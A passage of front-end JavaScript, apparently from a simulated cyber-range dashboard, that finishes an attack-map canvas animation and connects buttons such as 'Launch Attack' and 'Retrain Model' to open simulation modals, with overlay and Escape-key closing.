                ctx.textAlign = 'center';
                ctx.textBaseline = 'middle';
                const emoji = n.label.match(/^[^\s]+/)?.[0] || '';
                ctx.fillText(emoji, x, y);
                // Label
                ctx.font = '11px Inter, sans-serif';
                ctx.fillStyle = '#8892a8';
                ctx.textAlign = 'center';
                const labelText = n.label.replace(/^[^\s]+\s*/, '');
                ctx.fillText(labelText, x, y + n.r + 14);
            });
            mapAnimFrame = requestAnimationFrame(frame);
        }
        if (mapAnimFrame) cancelAnimationFrame(mapAnimFrame);
        frame();
    }

    // =================== WIRE UP TRIGGER BUTTONS ===================
    document.addEventListener('DOMContentLoaded', () => {
        // "Launch Attack" button on Attack Simulation page
        document.querySelector('[data-page="attacks"]')?.closest('.sidebar')?.parentElement
            ?.querySelectorAll('.btn-danger').forEach(btn => {
                if (btn.textContent.includes('Launch Attack')) {
                    btn.addEventListener('click', () => { openSim('simAttackTerminal'); startAttackTerminal(); });
                }
            });
        // Fallback: find by page content
        document.querySelectorAll('#page-attacks .btn-danger').forEach(btn => {
            if (btn.textContent.includes('Launch Attack')) {
                btn.addEventListener('click', () => { openSim('simAttackTerminal'); startAttackTerminal(); });
            }
        });
        // "Retrain Model" button on Traffic page
        document.querySelectorAll('#page-traffic .btn-outline').forEach(btn => {
            if (btn.textContent.includes('Retrain')) {
                btn.addEventListener('click', () => { openSim('simGanTraining'); startGanTraining(); });
            }
        });
        // "Generate" button on Traffic page opens Packet Inspector
        document.querySelectorAll('#page-traffic .btn-primary').forEach(btn => {
            if (btn.textContent.includes('Generate')) {
                btn.addEventListener('click', () => { openSim('simPacketInspector'); startPacketInspector(); });
            }
        });
        // "New Exercise" button on Dashboard
        document.querySelectorAll('#page-dashboard .btn-primary').forEach(btn => {
            if (btn.textContent.includes('New Exercise')) {
                btn.addEventListener('click', () => { openSim('simExercise'); startExercise(); });
            }
        });
        // Scenario "Launch" buttons open Attack Map
        document.addEventListener('click', e => {
            const btn = e.target.closest('.sc-actions .btn-primary');
            if (btn && btn.textContent.includes('Launch')) {
                openSim('simAttackMap');
                setTimeout(startAttackMap, 100);
            }
        });
        // Close on overlay click (outside modal)
        document.querySelectorAll('.sim-overlay').forEach(overlay => {
            overlay.addEventListener('click', e => {
                if (e.target === overlay) closeSim(overlay.id);
            });
        });
        // ESC key closes
        document.addEventListener('keydown', e => {
            if (e.key === 'Escape') {
                document.querySelectorAll('.sim-overlay.open').forEach(o => closeSim(o.id));
            }
        });
        // Handle close properly — stop attack terminal
        const origClose = closeSim;
    });
})();
